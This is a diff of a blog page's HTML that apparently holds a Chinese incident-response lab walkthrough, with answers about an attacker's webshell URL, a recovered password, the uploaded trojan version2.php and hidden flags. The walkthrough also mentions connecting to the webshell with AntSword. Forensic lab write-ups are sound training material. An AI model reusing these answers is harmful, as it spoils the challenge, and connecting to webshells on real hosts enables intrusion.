 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;在宝塔面板发现一个phpmyadmin的mysql数据库&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;进管理看数据&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;找密码即可&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015432.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015432.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3066,26 +1884,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Network&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2020&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015447.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015502.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015447.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015502.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3094,8 +1894,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Network&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2020&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;3-提交第一次webshell的连接url&#34;&gt;3. 提交第一次Webshell的连接URL
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;3-提交第一次webshell的连接url&#34;&gt;3. 提交第一次Webshell的连接URL&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -3105,16 +1905,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;register&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015513.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015513.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3123,8 +1914,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Webshell的连接&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//192.168.198.130/index.php?user-app-register&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;4-提交webshell连接密码&#34;&gt;4. 提交Webshell连接密码
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;4-提交webshell连接密码&#34;&gt;4. 提交Webshell连接密码&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -3132,16 +1923,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;根据题目3可以看出&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015530.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015530.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3152,18 +1934,9 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;使用蚁剑进行连接&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015548.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;5-提交数据包的flag1&#34;&gt;5. 提交数据包的flag1
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015548.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-提交数据包的flag1&#34;&gt;5. 提交数据包的flag1&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -3177,16 +1950,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;anaconda&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cfg&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;wp&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;数据包1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pcapng&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015601.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015601.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3195,16 +1959,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;首先&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;过滤一下http报文&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;可以看到这些报文都是攻击者192&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;.168.20.1&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;在访问Linux主机&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015612.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015612.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3213,16 +1968,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;先浏览一下过滤出来的报文&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;发现攻击者访问了&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag1路径&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;追踪http流&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015622.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015622.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3231,16 +1977,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;发现了一个第一个flag&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Network&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_2020_Hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;提交判题程序得知正确&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015637.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015637.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3249,8 +1986,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Network&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_2020_Hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;6-提交攻击者使用的后续上传的木马文件名称&#34;&gt;6. 提交攻击者使用的后续上传的木马文件名称
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;6-提交攻击者使用的后续上传的木马文件名称&#34;&gt;6. 提交攻击者使用的后续上传的木马文件名称&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -3258,16 +1995,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;查看数据包&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;可以看出&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;黑客上传了一个version2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php文件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015650.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015650.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3276,8 +2004,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;version2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;7-提交攻击者隐藏的flag2&#34;&gt;7. 提交攻击者隐藏的flag2
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;7-提交攻击者隐藏的flag2&#34;&gt;7. 提交攻击者隐藏的flag2&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -3285,16 +2013,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;根据命令可以看出&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;黑客进入了127&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;.0.0.1&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;文件夹&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;并创建了一个隐藏文件夹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;进入后查看&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015702.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015702.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3303,16 +2022,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;可以看出他编辑了这两个文件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cat看一下&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015711.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015711.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3321,16 +2031,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;alinotify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;发现flag2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
